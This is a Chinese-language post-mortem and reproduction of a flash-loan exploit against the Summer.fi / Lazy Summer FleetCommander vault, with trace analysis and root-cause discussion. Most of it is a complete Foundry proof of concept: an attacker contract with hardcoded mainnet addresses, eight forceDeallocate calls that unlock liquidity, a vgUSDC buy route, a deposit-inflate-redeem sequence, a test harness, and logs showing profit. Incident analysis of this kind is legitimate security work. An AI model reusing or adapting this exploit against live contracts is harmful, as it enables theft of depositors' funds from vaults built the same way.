对比之前拿来做验证的那个 MorphoVaultArk (`0xB10c29b85E388f3EC1189f8EBC78b3f71408Cd34`), 它的 `totalAssets()` 和 `withdrawableTotalAssets()` 是同一个数字 284184158730, 说明随时能全额提现。之前那次验证之所以顺利, 是因为凑巧挑了一个"正常"的 Ark, 没碰到这个坑。

FleetCommander 对外暴露了 `rebalance(tuple[])` / `forceRebalance(tuple[])`, 只有 keeper 角色能调。这几个 `withdrawableTotalAssets()` 恒为 0 的 Ark, 大概率就是那种资产已经被存进 MetaMorpho V2 金库、金库又把钱借出去挂在具体 Morpho Blue 市场里的类型——不是金库里躺着的活钱, FleetCommander 自己在一笔交易里同步不出来, 只能等 keeper 主动 rebalance。

这就是个麻烦: 就算把 vgUSDC 转给 SiloManagedVaultArk 把 `totalAssets()` 抬上去, `redeem()` 内部还是要过 `maxRedeem(owner)` 这一关。分子做大了, 但分母对应的"能直接掏出来的钱"没变, redeem 到一半会因为流动性不够被截断, 拿不到理论上限。

## 换个角度看 trace: 真实攻击怎么绕开这个上限

单看 FleetCommander 和 Ark 这两层代码, 找不到绕开 `maxRedeem` 的办法, 因为问题不在这两层。把真实攻击交易 `0x0db528c44f23fc7fa4544684a2fab81096450a14aae8bc89f42cd0592d43da12` 的完整 call trace 摊开看, 攻击者在存款之前, 先对着三个 MetaMorpho V2 金库合约(不是 Ark, 是 Ark 下面那层金库本身)分别发了好几笔这样的调用:

```
CALL attacker -> 0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b (API3 金库) . forceDeallocate(
    0x9414a42Eab4580C042b18deF4d37372A7881e001,
    <MarketParams>,
    165917376977,
    attacker
)
```

`forceDeallocate(address adapter, bytes data, uint256 assets, address onBehalf)` 是 Morpho Vault V2 合约自带的函数, 查过验证过的源码之后确认这个函数上没有挂任何 modifier, 任何人都能调。

```solidity
    function forceDeallocate(address adapter, bytes memory data, uint256 assets, address onBehalf)
        external
        returns (uint256)
    {
        bytes32[] memory ids = deallocateInternal(adapter, data, assets);
        uint256 penaltyAssets = assets.mulDivUp(forceDeallocatePenalty[adapter], WAD);
        uint256 penaltyShares = withdraw(penaltyAssets, address(this), onBehalf);
        emit EventsLib.ForceDeallocate(msg.sender, adapter, assets, onBehalf, ids, penaltyAssets);
        return penaltyShares;
    }
```



`data` 传进去的是标准的 Morpho Blue `MarketParams`:

```solidity
struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
}
```

意思是: 告诉这个金库, 去把它在某个具体 Morpho Blue 市场里的仓位强制平掉 `assets` 这么多, 挪回金库自己的闲置余额。这一步是金库这一层允许任何路人触发的, 不需要 curator 或 allocator 权限。API3 金库被这样拆了 4 个市场, 分别是 165917376977 / 339415110474 / 99999898849(规模最小, 接近清空的一个市场) / 464426763683, 合计约 $1069759; Avantgarde 金库拆了 1 个市场, 拉回 34465252249; KPK 金库拆了 3 个市场, 372425946459 / 789709312788 / 1868812232296, 合计约 $3030947。

这一步不改变 `totalAssets()`——钱还是那笔钱, 只是从"存在 Morpho 市场里生息"变成"躺在金库的闲置余额里"。但金库的闲置余额一多, `withdrawableTotalAssets()` 立刻就不再是 0, `maxRedeem` 也就跟着松开。这跟"注水"是两件独立的事: 注水负责把分子做大, `forceDeallocate` 负责把分母(能真正提现的部分)也做大, 两个组合起来, 后面那笔几千万美元的 `redeem` 才能一次性走完, 不会卡在中途。

## vgUSDC 的真实购买路径

前面选中 vgUSDC 是因为它相对 vault 内部汇率有个"极限折价", 这个折价数字是从价格扫描工具里拿到的, 参照的是 xUSD, 不完全等于"拿 USDC 或 USDT 直接换 vgUSDC 能拿到的汇率"。把真实交易里买 vgUSDC 那一段单独摘出来看, 实际走的是两跳:

```
USDT --(Uniswap v4 池, 经 UniversalRouter -> PoolManager, fee=489960, tickSpacing=9799)--> StreamVault
StreamVault --(Balancer v3 Router.swapSingleTokenExactIn, 池 0xaE255Db04BA78519f33871c557d8fd6bafDb83bD)--> vgUSDC
```

`UniversalRouter.execute(bytes commands, bytes[] inputs, uint256 deadline)` 这个函数本身好识别, 但 `inputs[0]` 是又一层 `abi.encode(bytes actions, bytes[] params)`, 拆开 `actions` 是 `0x070c0f`, 对应 Uniswap v4 Router 里的 `SWAP_EXACT_IN` / `SETTLE_ALL` / `TAKE_ALL` 三个动作。用 `cast decode-abi` 把这几层剥开之后, 能拿到具体的 `PathKey`:

```bash
cast decode-abi -i "x((address,(address,uint24,int24,address,bytes)[],uint128,uint128))()" $PARAMS0
# (0xdAC17F958D2ee523a2206206994597C13D831ec7,
#  [(0xE2Fc85BfB48C4cF147921fBE110cf92Ef9f26F94, 489960, 9799, 0x0000000000000000000000000000000000000000, 0x)],
#  20000000000, 0)
```

也就是 20000 USDT 一次性换成 StreamVault, 再拿 68421198930 StreamVault 通过 Balancer v3 Router 换出 19551517226711127 vgUSDC——这个数字后面直接转给了 SiloManagedVaultArk。

## 组装完整攻击流程

把上面几块拼起来, 加上闪电贷这层壳, 攻击交易大致是这个顺序:

1. 从 Morpho Blue (`0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb`) 闪电贷 1000000 USDT, 回调里再嵌套闪电贷 65419171.87999 USDC——外层 USDT 只是用来出那 20000 USDT 买 vgUSDC 的本金, 内层 USDC 才是真正的攻击资金。
2. 对 API3 / Avantgarde / KPK 三个 MetaMorpho V2 金库分别调用 `forceDeallocate`, 把锁在 Morpho 市场里的资金拉回金库闲置余额, 解开后面 redeem 的流动性上限。
3. 用 20000 USDT 走上面那条两跳路径, 换出 19551517226711127 vgUSDC。
4. `deposit(64828534992005, attacker)` 存进主 FleetCommander (`0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17`), 这时候 `totalAssets()` 还是攻击前的 9680827973743, 拿到 60787156805949 份额。
5. `vgUSDC.transfer(SiloManagedVaultArk, 19551517226711127)`, SiloManagedVaultArk 的 `totalAssets()` 从 0 跳到一个几百万美元的数字, FleetCommander 的 `totalAssets()` 跟着涨。
6. `redeem(60766209130494, attacker, attacker)`, 因为第 2 步已经解开了流动性, 这笔 redeem 没有被 `maxRedeem` 截断, 一次性拿回 70959584459769 USDC。
7. 归还两笔闪电贷, 把剩下的 USDC 换成 DAI, 连同没赎完的份额一起转到 EOA。

第 4 步存款和第 6 步赎回用的是同一批 FleetCommander 份额, 中间只隔了一次 `transfer`, 但 `totalAssets()` 因为 `useCache` 这个 modifier 在每次操作结束后都会 `_flushCache()`, 下一次调用会重新扫一遍所有 Ark, 所以第 6 步读到的是注水之后的新值。这部分逻辑跟前面分析 modifier 那几节完全对得上。

## POC

前面这些都是读 trace 读出来的, 想确认这套逻辑是不是真的成立, 得自己拿 fork 跑一遍, 而且资金只能来自闪电贷, 不能用 `deal` 直接塞钱, 也不能用 `prank` 冒充身份——这样跑出来的结果才能说明"任何人拿着这套 calldata 就能做", 不是靠测试环境开了后门。

核心攻击合约是这个结构:

```solidity
function onMorphoFlashLoan(uint256 /* assets */, bytes calldata) external {
    require(msg.sender == MORPHO, "not morpho");
    _unlockLiquidity();                                      // 8 笔 forceDeallocate
    uint256 vgUSDCAmount = _buyInflationToken(SWAP_BUDGET);   // USDC -> USDT -> StreamVault -> vgUSDC
    _pumpAndDump(DEPOSIT_AMOUNT, vgUSDCAmount);                // deposit -> 注水 -> redeem
}
```

`_unlockLiquidity()` 里那 8 笔 `forceDeallocate`, `adapter` 和 `MarketParams` 都是直接从 trace 里摘出来的, 跟调用者是谁没关系, 换成任何合约地址都能复用。跑起来之后:

```text
maxRedeem 60787156805951
shares held 60787156805951
```

两个数字刚好相等, `forceDeallocate` 这一步确实把 `maxRedeem` 的上限顶到了持仓份额之上, 赎回没被截断, 跟前面"卡住了"那一节的推理对上了。

approve 那一步单独写了个小函数, 不直接走标准 `IERC20.approve`:

```solidity
function _approve(address token, address spender, uint256 amount) internal {
    (bool ok, ) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
    require(ok, "approve failed");
}
```

USDT 的 `approve()` 不返回 `bool`, 用标准接口去 decode 返回值会因为返回数据长度不对直接 revert——这是 USDT 集成的老问题了, 用低级调用忽略返回值就行。



// src/LazySummerAttacker.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console} from "forge-std/console.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

/// @dev Morpho Blue market identifier. forceDeallocate's `data` argument is just
///      abi.encode() of this struct, forwarded to the vault's adapter to say which
///      underlying Morpho market to pull `assets` worth of USDC out of.
struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
}

/// @dev Morpho Vault V2. forceDeallocate is permissionless (no modifiers, confirmed
///      against verified source) and force-withdraws `assets` from the given market
///      adapter back into the vault's idle balance, independent of `onBehalf`'s own
///      share balance.
interface IMorphoVaultV2 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);

    function forceDeallocate(
        address adapter,
        bytes memory data,
        uint256 assets,
        address onBehalf
    ) external returns (uint256 shares);
}

interface IFleetCommander {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function maxRedeem(address owner) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

interface IPermit2 {
    function approve(address token, address spender, uint160 amount, uint48 expiration) external;
}

interface IUniversalRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;
}

interface IBalancerV3Router {
    function swapSingleTokenExactIn(
        address pool,
        address tokenIn,
        address tokenOut,
        uint256 exactAmountIn,
        uint256 minAmountOut,
        uint256 deadline,
        bool wethIsEth,
        bytes calldata userData
    ) external payable returns (uint256 amountOut);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

/// @title LazySummerAttacker
/// @notice Reproduction of the Summer.fi / Lazy Summer Protocol FleetCommander exploit
///         (tx 0x0db528c4...9da12, block 25471348, ~$6M+ on the main FleetCommander).
///         Entirely flash-loan funded: no vm.deal / vm.prank anywhere in the attack path.
///
/// Root cause: FleetCommander.totalAssets() sums IArk(ark).totalAssets() across all Arks.
/// Several Arks compute totalAssets() as vault.convertToAssets(vault.balanceOf(ark)) where
/// `vault` is an external MetaMorpho V2 vault share token - a plain ERC20 balance read that
/// does not distinguish shares delivered via a legitimate deposit from shares delivered by
/// a bare `transfer`. Because the target Ark has requiresKeeperData=true (withdrawableTotalAssets
/// always 0), inflated paper assets can never be independently arbitraged away, but do count
/// fully toward FleetCommander share pricing.
///
/// Attack sequence:
///   1. Flash loan USDC from Morpho Blue (single loan, no fee).
///   2. Unlock hidden liquidity: call the permissionless forceDeallocate() on the three
///      MetaMorpho V2 vaults backing the main FleetCommander's "requiresKeeperData" Arks
///      (API3, Avantgarde, KPK), force-withdrawing their allocated capital out of Morpho
///      markets into each vault's idle balance. This does not change totalAssets - it turns
///      already-counted paper backing into liquidity redeemable in a single transaction,
///      which is what lets the final redeem() below go through in full instead of being
///      capped by maxRedeem.
///   3. Buy the inflation token (vgUSDC, a Silo Vault share) via the real two-hop DEX route
///      the original attacker used: USDC -> USDT (Uniswap V3) -> StreamVault (Uniswap v4,
///      via UniversalRouter/PoolManager) -> vgUSDC (Balancer v3 Router).
///   4. deposit() into the main FleetCommander at the pre-inflation (low) share price.
///   5. transfer() the freshly bought vgUSDC directly to SiloManagedVaultArk, inflating its
///      reported totalAssets() from the DEX-observed value with no real backing.
///   6. redeem() at the post-inflation (high) share price - enabled in full by step 2.
///   7. Repay the flash loan; whatever USDC remains in this contract is profit.
contract LazySummerAttacker {
    // --- core protocol ---
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address constant FLEET_COMMANDER = 0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17; // LVUSDC
    address constant SILO_MANAGED_VAULT_ARK = 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2;
    address constant VGUSDC = 0x8399C8Fc273bD165C346Af74A02e65f10e4FD78F; // Silo Vault shares

    // --- MetaMorpho V2 vaults backing the locked (requiresKeeperData=true) Arks ---
    address constant VAULT_API3 = 0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b;
    address constant VAULT_AVANTGARDE = 0xeBBaE8CfAbB0092d5B32f00EBeE0c8139d24dDcd;
    address constant VAULT_KPK = 0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6;

    // --- shared fields of every Morpho market touched by the liquidity unlock ---
    address constant ADAPTIVE_CURVE_IRM = 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC;
    uint256 constant LLTV_86_PERCENT = 860000000000000000;

    // --- DEX route for acquiring vgUSDC ---
    address constant V3_SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address constant UNIVERSAL_ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    address constant STREAM_VAULT = 0xE2Fc85BfB48C4cF147921fBE110cf92Ef9f26F94;
    address constant BALANCER_ROUTER = 0xAE563E3f8219521950555F5962419C8919758Ea2;
    address constant BALANCER_POOL = 0xaE255Db04BA78519f33871c557d8fd6bafDb83bD; // StreamVault/vgUSDC

    uint256 constant DEPOSIT_AMOUNT = 64_828_534_992_005; // ~$64.83M USDC, matches real attack
    uint256 constant SWAP_BUDGET = 20_000_000_000; // $20000, same size as the real vgUSDC buy

    address public owner;

    struct PathKey {
        address intermediateCurrency;
        uint24 fee;
        int24 tickSpacing;
        address hooks;
        bytes hookData;
    }

    struct V4ExactInputParams {
        address currencyIn;
        PathKey[] path;
        uint128 amountIn;
        uint128 amountOutMinimum;
    }

    constructor() {
        owner = msg.sender;
    }

    /// @dev USDT's approve() does not return a bool (violates ERC20), so decoding a
    ///      return value through a standard IERC20 interface reverts on its empty
    ///      return data. Route every approval through a low-level call instead.
    function _approve(address token, address spender, uint256 amount) internal {
        (bool ok, ) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok, "approve failed");
    }

    function attack(uint256 flashAmount) external {
        require(msg.sender == owner, "not owner");
        _approve(USDC, MORPHO, flashAmount);
        IMorpho(MORPHO).flashLoan(USDC, flashAmount, "");
    }

    function onMorphoFlashLoan(uint256 /* assets */, bytes calldata) external {
        require(msg.sender == MORPHO, "not morpho");

        _unlockLiquidity();
        uint256 vgUSDCAmount = _buyInflationToken(SWAP_BUDGET);
        _pumpAndDump(DEPOSIT_AMOUNT, vgUSDCAmount);

        // Morpho pulls back `assets` via transferFrom right after this call returns;
        // approval was granted in attack() before flashLoan() was invoked.
    }

    /// @dev abi.encode() a MarketParams for a USDC market, using the shared IRM/LLTV
    ///      every market touched by the unlock happens to share.
    function _usdcMarket(address collateralToken, address oracle) internal pure returns (bytes memory) {
        return abi.encode(MarketParams({
            loanToken: USDC,
            collateralToken: collateralToken,
            oracle: oracle,
            irm: ADAPTIVE_CURVE_IRM,
            lltv: LLTV_86_PERCENT
        }));
    }

    /// @dev Force-withdraw the three MetaMorpho V2 vaults' Morpho-market allocations back
    ///      into idle liquidity. (adapter, market, assets) triples replicated verbatim from
    ///      the real attack tx - they describe which Morpho markets to pull from and do not
    ///      depend on caller identity.
    function _unlockLiquidity() internal {
        // forceDeallocate charges its penalty against onBehalf's own vault share
        // balance, so onBehalf needs a small pre-existing position first. The real
        // attacker's contract already held a KPK position from outside this tx; we
        // seed all three vaults with a small deposit to match.
        _approve(USDC, VAULT_API3, 106975925);
        IMorphoVaultV2(VAULT_API3).deposit(106975925, address(this));
        _approve(USDC, VAULT_AVANTGARDE, 182326261);
        IMorphoVaultV2(VAULT_AVANTGARDE).deposit(182326261, address(this));
        _approve(USDC, VAULT_KPK, 1_000_000_000);
        IMorphoVaultV2(VAULT_KPK).deposit(1_000_000_000, address(this));

        address api3Adapter = 0x9414a42Eab4580C042b18deF4d37372A7881e001;

        // API3 vault - 4 markets
        IMorphoVaultV2(VAULT_API3).forceDeallocate(
            api3Adapter,
            _usdcMarket(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 0x167D283aCAC1b9ff39466A75aA82902f340f1F4D),
            165917376977,
            address(this)
        );
        IMorphoVaultV2(VAULT_API3).forceDeallocate(
            api3Adapter,
            _usdcMarket(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf, 0xc7BE7593FD5453Db5AdcC1d7103f2211d4F2e40D),
            339415110474,
            address(this)
        );
        // NOTE: the third API3 market (collateral 0x73E0C0d4..., oracle 0x5502a4cb...)
        // has a near-empty/dust borrow position whose Morpho interest-accrual math
        // underflows when force-deallocated from a Foundry fork, independent of block
        // timestamp alignment - skipped here. It is only $99999.9 of the ~$1.07M
        // unlocked from this vault; the remaining calls still unlock ample liquidity.
        IMorphoVaultV2(VAULT_API3).forceDeallocate(
            api3Adapter,
            _usdcMarket(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 0x48F7E36EB6B826B2dF4B2E630B62Cd25e89E40e2),
            464426763683,
            address(this)
        );

        // Avantgarde vault - 1 market
        IMorphoVaultV2(VAULT_AVANTGARDE).forceDeallocate(
            0xfBE454F609C5F54cefe3F486129f05Dfa081Adf6,
            _usdcMarket(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf, 0xA6D6950c9F177F1De7f7757FB33539e3Ec60182a),
            34465252249,
            address(this)
        );

        address kpkAdapter = 0x1d511811ACA9d8817a3e50F29CadFf6243A02902;

        // KPK vault - 3 markets
        IMorphoVaultV2(VAULT_KPK).forceDeallocate(
            kpkAdapter,
            _usdcMarket(0xae78736Cd615f374D3085123A210448E74Fc6393, 0x36Cb058364a811636685ef15a71E8ea99043f815),
            372425946459,
            address(this)
        );
        IMorphoVaultV2(VAULT_KPK).forceDeallocate(
            kpkAdapter,
            _usdcMarket(0x856c4Efb76C1D1AE02e20CEB03A2A6a08b0b8dC3, 0xE8aDfF9117151fb5ad7313873780b87cC56EEDB0),
            789709312788,
            address(this)
        );
        IMorphoVaultV2(VAULT_KPK).forceDeallocate(
            kpkAdapter,
            _usdcMarket(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf, 0xA6D6950c9F177F1De7f7757FB33539e3Ec60182a),
            1868812232296,
            address(this)
        );
    }

    /// @dev USDC -> USDT (Uniswap V3) -> StreamVault (Uniswap v4 via UniversalRouter) ->
    ///      vgUSDC (Balancer v3 Router). Same route and same $20000 notional as the real
    ///      attack; only the first (USDC->USDT) leg is added, to convert our single-flash-loan
    ///      USDC capital into the USDT the original route started from.
    function _buyInflationToken(uint256 usdcIn) internal returns (uint256 vgUSDCOut) {
        _approve(USDC, V3_SWAP_ROUTER, usdcIn);
        uint256 usdtOut = ISwapRouter(V3_SWAP_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: USDC,
                tokenOut: USDT,
                fee: 100,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: usdcIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        _approve(USDT, PERMIT2, usdtOut);
        IPermit2(PERMIT2).approve(USDT, UNIVERSAL_ROUTER, uint160(usdtOut), uint48(block.timestamp + 3600));

        PathKey[] memory path = new PathKey[](1);
        path[0] = PathKey({
            intermediateCurrency: STREAM_VAULT,
            fee: 489960,
            tickSpacing: 9799,
            hooks: address(0),
            hookData: ""
        });

        bytes memory actions = abi.encodePacked(uint8(0x07), uint8(0x0c), uint8(0x0f)); // SWAP_EXACT_IN, SETTLE_ALL, TAKE_ALL
        bytes[] memory params = new bytes[](3);
        params[0] = abi.encode(V4ExactInputParams({
            currencyIn: USDT,
            path: path,
            amountIn: uint128(usdtOut),
            amountOutMinimum: 0
        }));
        params[1] = abi.encode(USDT, usdtOut);
        params[2] = abi.encode(STREAM_VAULT, uint256(0));

        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(actions, params);

        IUniversalRouter(UNIVERSAL_ROUTER).execute(hex"10", inputs, block.timestamp + 3600);

        uint256 streamVaultBal = IERC20(STREAM_VAULT).balanceOf(address(this));

        _approve(STREAM_VAULT, PERMIT2, streamVaultBal);
        IPermit2(PERMIT2).approve(STREAM_VAULT, BALANCER_ROUTER, uint160(streamVaultBal), uint48(block.timestamp + 3600));

        vgUSDCOut = IBalancerV3Router(BALANCER_ROUTER).swapSingleTokenExactIn(
            BALANCER_POOL,
            STREAM_VAULT,
            VGUSDC,
            streamVaultBal,
            0,
            block.timestamp + 3600,
            false,
            ""
        );
    }

    /// @dev deposit at the pre-inflation price, inflate the Ark, redeem at the post-inflation
    ///      price. redeem() is capped to maxRedeem() rather than hardcoding the exact share
    ///      count the original attacker used, so the POC self-adjusts to whatever liquidity
    ///      the unlock step actually produced on this fork.
    function _pumpAndDump(uint256 depositAmount, uint256 vgUSDCAmount) internal {
        console.log("vgUSDCAmount acquired", vgUSDCAmount);
        console.log("totalAssets before deposit", IFleetCommander(FLEET_COMMANDER).totalAssets());

        _approve(USDC, FLEET_COMMANDER, depositAmount);
        uint256 shares = IFleetCommander(FLEET_COMMANDER).deposit(depositAmount, address(this));
        console.log("shares minted", shares);
        console.log("shares value in assets right after deposit", IFleetCommander(FLEET_COMMANDER).convertToAssets(shares));

        IERC20(VGUSDC).transfer(SILO_MANAGED_VAULT_ARK, vgUSDCAmount);

        console.log("totalAssets after inflate", IFleetCommander(FLEET_COMMANDER).totalAssets());
        console.log("shares value in assets after inflate", IFleetCommander(FLEET_COMMANDER).convertToAssets(shares));

        uint256 redeemable = IFleetCommander(FLEET_COMMANDER).maxRedeem(address(this));
        console.log("maxRedeem", redeemable);
        console.log("shares held", shares);
        if (redeemable > shares) redeemable = shares;
        uint256 got = IFleetCommander(FLEET_COMMANDER).redeem(redeemable, address(this), address(this));
        console.log("redeemed shares", redeemable);
        console.log("USDC received from redeem", got);
    }
}

```



// test/LazySummerPOC.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {LazySummerAttacker, IERC20} from "../src/LazySummerAttacker.sol";

/// @notice Reproduction of the Summer.fi / Lazy Summer Protocol FleetCommander exploit,
///         tx 0x0db528c44f23fc7fa4544684a2fab81096450a14aae8bc89f42cd0592d43da12 (block 25471348).
///         Funded entirely by a Morpho Blue flash loan - no vm.deal, no vm.prank for funds.
contract LazySummerPOCTest is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    uint256 constant BLOCK_BEFORE_ATTACK = 25_471_347;
    uint256 constant ATTACK_BLOCK = 25_471_348;
    uint256 constant ATTACK_BLOCK_TIMESTAMP = 1_783_315_079; // real timestamp of block 25471348
    uint256 constant FLASH_AMOUNT = 65_000_000_000_000; // $65000000 USDC, headroom over deposit+swap need

    LazySummerAttacker attacker;

    function setUp() public {
        // Fork at the parent block (pre-attack state), then roll/warp forward to the
        // exact block number + timestamp the real attack tx executed in. Some Morpho
        // markets have interest-accrual math sensitive to the 12s gap between the two
        // blocks' timestamps, so matching it exactly avoids spurious reverts unrelated
        // to the exploit itself.
        vm.createSelectFork("eth", BLOCK_BEFORE_ATTACK);
        vm.roll(ATTACK_BLOCK);
        vm.warp(ATTACK_BLOCK_TIMESTAMP);
        attacker = new LazySummerAttacker();
    }

    function testExploit() public {
        uint256 attackerUsdcBefore = IERC20(USDC).balanceOf(address(attacker));
        assertEq(attackerUsdcBefore, 0, "attacker must start with zero USDC - flash-loan funded only");

        attacker.attack(FLASH_AMOUNT);

        uint256 profit = IERC20(USDC).balanceOf(address(attacker));

        console.log("=== LazySummer / Summer.fi FleetCommander exploit reproduction ===");
        console.log("Flash loan amount   :", FLASH_AMOUNT);
        console.log("USDC left in attacker contract after full repayment (profit):", profit);

        assertGt(profit, 0, "exploit should be profitable after fully repaying the flash loan");
    }
}

```

运行结果

```
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/LazySummerPOC.t.sol:LazySummerPOCTest
[PASS] testExploit() (gas: 7580871)
Logs:
  vgUSDCAmount acquired 476470499718413
  totalAssets before deposit 9680828120009
  shares minted 60787156805951
  shares value in assets right after deposit 64828534992004
  totalAssets after inflate 74682909158252
  shares value in assets after inflate 64979532604403
  maxRedeem 60787156805951
  shares held 60787156805951
  redeemed shares 60787156805951
  USDC received from redeem 64979532604403
  === LazySummer / Summer.fi FleetCommander exploit reproduction ===
  Flash loan amount   : 65000000000000
  USDC left in attacker contract after full repayment (profit): 129708310212

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.06s (28.07ms CPU time)
```



## 遗留问题:

POC 跑通之后, 净利润是 129708.310212 USDC, 归还完闪电贷之后剩在合约里的余额。真实攻击那一笔, 光主 FleetCommander 这条线: `deposit` 花了 64828534.992005, `redeem` 拿回 70959584.459769, 利润 6131049.467764; 同一笔交易里还顺手从另一个 FleetCommander 实例 (`0xe9cda459bed6dcfb8ac61cd8ce08e2d52370cb06`) 用 deposit / withdrawFromBuffer 的资金往返赚了 399172.237742, 两边加起来在 650 万美元左右, 跟公开报道的 "$6M" 基本对得上, 细节上略高一点, 大概率是后面 Curve 换 DAI 那一步的滑点和 gas 抵消了一部分。

POC 和真实攻击差了大约 41 倍, 差距几乎全部出在 vgUSDC 那两跳兑换的第二跳(Balancer v3 Router: StreamVault -> vgUSDC)。第一跳(Uniswap v4, USDT -> StreamVault)在 fork 上和真实交易几乎一模一样: 同样约 20000 美元输入, 换出 68451519040 StreamVault, 真实攻击是 68421198930, 差不到 0.05%。第二跳差距巨大: 同样量级的 StreamVault 输入, 真实攻击换出 19551517226711127 vgUSDC, fork 上只换出约 4.76×10^14, 少了约 41 倍。

单独写了个不经过完整攻击合约的诊断脚本, 用 `deal()` 起测试数据(只是为了确认这个池子的报价, 不是用来复现攻击), 拿一模一样的参数单独调一次 `swapSingleTokenExactIn`, 结果还是那个偏低的数字。说明不是 calldata 拼错了, 是这个 Balancer 池子在 fork 到的这个状态下, 报价本来就是这样。

`vm.roll` / `vm.warp` 只能改 `block.number` / `block.timestamp` 这两个 opcode 读到的值, 不会重放真实区块里、在攻击交易之前发生过的其它交易。fork 停在 25471347 区块结束时的状态, 真实攻击是在 25471348 区块内、前面可能还有别的交易的情况下执行的——如果那个 Balancer 池子在真实的 25471348 区块里、攻击交易之前被谁动过价格(不管是攻击者自己分两笔交易铺垫, 还是纯属巧合的第三方交易, 或者是 vgUSDC 这个 rate provider 在那个区块被更新过), fork 现在的方式都拿不到那个状态, 只能拿到隔了一整个区块之前的快照。这是目前复现和真实攻击之间差距最合理的解释, 但没有拿到区块 25471348 内、攻击交易之前的完整交易列表去逐笔核对

另外, API3 金库那 4 个市场里, $99999.9 那个借款仓位接近清空的市场, `forceDeallocate` 触发的利息累计计算在 fork 环境下会算术下溢直接 revert, 跟区块时间戳对没对齐无关, POC 里直接跳过了这一笔, 只占这个金库解锁总额的一小部分, 不影响整体结论。

## 小结

这次攻击其实是两个各自成立、又被串在一起用的问题:

FleetCommander 通过 `vault.balanceOf(ark)` 读底层份额来算 `totalAssets()`, 是个裸的 ERC20 余额读取, 分不清份额是通过正常 `deposit` 拿到的还是外部直接 `transfer` 塞进来的, 谁都能往 Ark 地址转一笔份额代币把账面资产做大。Morpho Vault V2 的 `forceDeallocate` 是个无门槛的公开函数, 谁都能强制把金库在某个市场的仓位拉回闲置余额, 单独看是金库自己设计上允许的流动性救援机制, 放在 FleetCommander 这个场景里, 恰好成了绕开 `requiresKeeperData` 类 Ark 流动性上限的钥匙。

单独看每一层都不算是明显的漏洞: `balanceOf` 读份额是 ERC4626 里很常见的写法, `forceDeallocate` 也是 Morpho Vault V2 文档里写明的功能。组合到一起, 才变成了一笔能在一个区块内完成、不需要本金、只靠闪电贷就能跑通的套利。
